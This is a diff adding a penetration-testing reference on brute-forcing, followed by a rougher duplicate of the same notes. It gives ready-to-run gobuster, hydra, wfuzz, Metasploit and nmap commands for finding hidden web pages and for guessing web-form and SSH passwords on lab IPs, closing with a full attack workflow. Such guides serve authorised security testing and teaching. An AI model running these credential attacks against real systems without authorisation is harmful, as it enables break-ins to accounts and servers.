@@ -1,0 +1,294 @@
+================================================================================
+                    BRUTE FORCING & WEB ENUMERATION - REFERENCE
+================================================================================
+
+OVERVIEW
+--------
+This guide covers discovering hidden web content, brute-forcing login forms,
+and brute-forcing SSH credentials. These techniques are used during the
+enumeration and exploitation phases of a penetration test.
+
+Useful resource:
+https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/
+
+Required tools: gobuster, hydra, wfuzz, nmap, metasploit
+Required wordlists: dirb, seclists, rockyou
+
+================================================================================
+              STEP 1 — DISCOVER HIDDEN DIRECTORIES & FILES (GOBUSTER)
+================================================================================
+
+WHAT IT DOES
+------------
+Gobuster brute-forces URLs on a web server to find hidden pages and folders
+such as /admin, /login.php, /backup, /uploads, etc. that aren't linked
+anywhere on the visible site.
+
+INSTALL WORDLISTS (if not already installed)
+---------------------------------------------
+
+  sudo apt install seclists
+  sudo apt install dirb
+
+BASIC USAGE
+-----------
+
+  gobuster dir -u http://<TARGET_IP_OR_DOMAIN> -w <wordlist>
+
+  Example with dirb wordlist:
+  gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/dirb/common.txt
+
+  Example with seclists (more comprehensive):
+  gobuster dir -u http://192.168.1.11 -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+USEFUL FLAGS
+------------
+
+  -u          Target URL
+  -w          Wordlist path
+  -x          File extensions to search for (e.g. -x php,html,txt)
+  -t          Number of threads (default 10, increase for speed: -t 50)
+  -o          Save output to file
+  -q          Quiet mode — only show results, no progress bar
+
+  Example — search for specific file types:
+  gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+
+NOTE: Once you find a hidden page (e.g. /admin or /login.php), note the
+      URL and field names — you will need these for the next step.
+
+================================================================================
+              STEP 2 — BRUTE FORCE LOGIN FORMS & BASIC AUTH (HYDRA)
+================================================================================
+
+WHAT IT DOES
+------------
+Hydra tries many username/password combinations against a login page or
+service until it finds valid credentials.
+
+BEFORE YOU START — INSPECT THE LOGIN FORM
+------------------------------------------
+
+  1. Open the target login page in your browser
+  2. Right-click anywhere → Inspect (or F12)
+  3. Go to the Network tab, submit the form with any test value
+  4. Look at the POST request — note:
+       - The form action URL (e.g. /login.php)
+       - The field names (e.g. username=, password=)
+       - The error message shown on failed login (e.g. "Invalid login")
+  You need all three of these for the hydra command below.
+
+HTTP BASIC AUTH (simple password-protected pages)
+--------------------------------------------------
+
+  hydra -L users.txt -P passwords.txt <TARGET_IP> http-get /protected/page
+
+  Example:
+  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.11 http-get /admin
+
+WEB FORM — POST BASED (most common login pages)
+------------------------------------------------
+
+  hydra -l <user> -P <wordlist> <TARGET_IP> http-post-form "<path>:<fields>:<fail_message>"
+
+  Example:
+  hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.11 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+
+  Breaking down the http-post-form string:
+    /login.php               Location of the login form
+    username=^USER^          Field name for username (from HTML inspection)
+    &password=^PASS^         Field name for password (from HTML inspection)
+    Invalid login            Text that appears on the page when login FAILS
+
+  NOTE: ^USER^ and ^PASS^ are placeholders — hydra replaces them with
+        each wordlist entry automatically. Get the exact field names from
+        the HTML form inspection or Burp Suite.
+
+  With verbose output (see every attempt):
+  hydra -l admin -P rockyou.txt 192.168.1.11 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login" -V -F
+
+================================================================================
+              STEP 3 — ADVANCED FUZZING WITH WFUZZ (OPTIONAL)
+================================================================================
+
+WHAT IT DOES
+------------
+Wfuzz is more flexible than Hydra and Gobuster — it can fuzz any part of
+a request including URL parameters, headers, cookies, and POST data.
+Use it when you need more control over what gets fuzzed.
+
+BASIC USAGE
+-----------
+
+  wfuzz -c -w <wordlist> -u "http://target.com/login.php?user=FUZZ&pass=test"
+
+  FUZZ is the placeholder — wfuzz replaces it with each wordlist entry.
+
+  Example — fuzz a URL parameter:
+  wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.1.11/FUZZ"
+
+  Example — fuzz a POST form field:
+  wfuzz -c -w rockyou.txt -d "username=admin&password=FUZZ" -u "http://192.168.1.11/login.php"
+
+USEFUL FLAGS
+------------
+
+  -c          Coloured output
+  -w          Wordlist
+  -u          Target URL
+  -d          POST data string
+  --hc 404    Hide responses with status code 404 (filter out not found)
+  --hh <n>    Hide responses with a specific number of characters (filter false positives)
+
+  Example — hide 404s to clean up output:
+  wfuzz -c -w common.txt --hc 404 -u "http://192.168.1.11/FUZZ"
+
+================================================================================
+                   STEP 4 — BRUTE FORCING SSH CREDENTIALS
+================================================================================
+
+WHAT IT DOES
+------------
+Once you have a target IP with port 22 open (confirmed via nmap), you can
+brute-force SSH login credentials using Hydra, Metasploit, or Nmap NSE.
+
+CONFIRM SSH IS OPEN FIRST
+--------------------------
+
+  nmap -sV -p 22 <TARGET_IP>
+
+  Or discover all live hosts and open ports:
+  nmap -sn 192.168.1.0/24
+  nmap -A 192.168.1.11
+
+METHOD 1 — HYDRA (fastest, most common)
+-----------------------------------------
+
+  Known username:
+  hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
+
+  Unknown username (try both lists):
+  hydra -L /usr/share/wordlists/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -f
+
+  Example:
+  hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.9 -t 4 -V -F
+
+  Flags recap:
+    -t 4     Use 4 threads (SSH servers may block too many at once)
+    -f       Stop after first valid login found
+    -V       Show every attempt
+    -F       Stop all threads immediately on success
+
+METHOD 2 — METASPLOIT (ssh_login module)
+------------------------------------------
+
+  msfconsole
+
+  Inside Metasploit:
+  use auxiliary/scanner/ssh/ssh_login
+  set RHOSTS <TARGET_IP>
+  set USER_FILE /usr/share/wordlists/top-usernames-shortlist.txt
+  set PASS_FILE /usr/share/wordlists/rockyou.txt
+  set THREADS 4
+  set VERBOSE true
+  run
+
+  NOTE: Metasploit will open a session automatically if credentials are found.
+        Type sessions -l to list open sessions.
+        Type sessions -i 1 to interact with session 1.
+
+METHOD 3 — NMAP NSE SCRIPT
+----------------------------
+
+  nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <TARGET_IP>
+
+  NOTE: Slower than Hydra but useful if you want everything in one nmap workflow.
+
+================================================================================
+                            FULL ATTACK WORKFLOW
+================================================================================
+
+  Step 1   nmap -sV 192.168.1.11                    Confirm open ports and services
+  Step 2   gobuster dir -u http://192.168.1.11       Discover hidden pages
+             -w /usr/share/wordlists/dirb/common.txt
+  Step 3   Inspect the login form in browser         Get field names and fail message
+  Step 4   hydra -l admin -P rockyou.txt             Brute force the login form
+             192.168.1.11 http-post-form
+             "/login.php:username=^USER^&password=^PASS^:Invalid login"
+  Step 5   hydra -l <user> -P rockyou.txt            Brute force SSH if port 22 open
+             ssh://192.168.1.11 -t 4 -f -V
+
+================================================================================
+                              IMPORTANT NOTES
+================================================================================
+
+  - Only use these techniques on systems you own or have written permission
+    to test. Unauthorised access is illegal.
+  - SSH servers may lock you out after too many failed attempts (fail2ban).
+    Keep -t low (4) to reduce the chance of triggering lockouts.
+  - Always run nmap first to confirm which ports and services are open
+    before choosing your attack method.
+  - If rockyou.txt is compressed, unzip it first:
+    sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+================================================================================
+
+
+
+
+
+
+🔹 1. Brute-Forcing Hidden Directories or Files
+
+https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/  (great website that shows how)
+
+✅ Tool: gobuster
+This is used to discover hidden folders or files like /admin, /login.php, etc.
+
+📌 Example:
+
+gobuster dir -u http://TARGET_IP_OR_DOMAIN -w /usr/share/wordlists/dirb/common.txt
+-u: Target URL
+
+-w: Wordlist (use dirb, seclists, or custom)
+
+🧠 Tip: If you don’t have the wordlist, install it:
+
+
+sudo apt install seclists
+And use something like:
+
+
+-w /usr/share/seclists/Discovery/Web-Content/common.txt
+🔹 2. Brute-Forcing Login (Forms or Basic Auth)
+
+✅ Tool: hydra
+This is for trying many usernames/passwords on a login form.
+
+📌 HTTP Basic Auth Example:
+
+hydra -L users.txt -P passwords.txt TARGET_IP http-get /protected/page
+📌 Web Form Example (POST-based):
+
+hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
+Replace:
+
+/login.php: form location
+
+username=^USER^&password=^PASS^: field names
+
+"Invalid login": text returned on failure
+
+🔑 You must inspect the HTML form (via browser > right-click > Inspect) to get correct parameter names.
+
+🔹 3. Using wfuzz (More flexible, but advanced)
+Another powerful option if you want to fuzz custom parameters:
+
+
+wfuzz -c -w wordlist.txt -u http://target.com/login.php?user=FUZZ&pass=test
+
+
+Brute-Forcing SSH credentials
+One of the most reliable ways to gain SSH access to servers is by brute-forcing credentials.
+
+This can be done using various ways: Metasploit’s ssh_login module (auxilliary/scanner/ssh/ssh_login), Hydra or Nmap NSE.
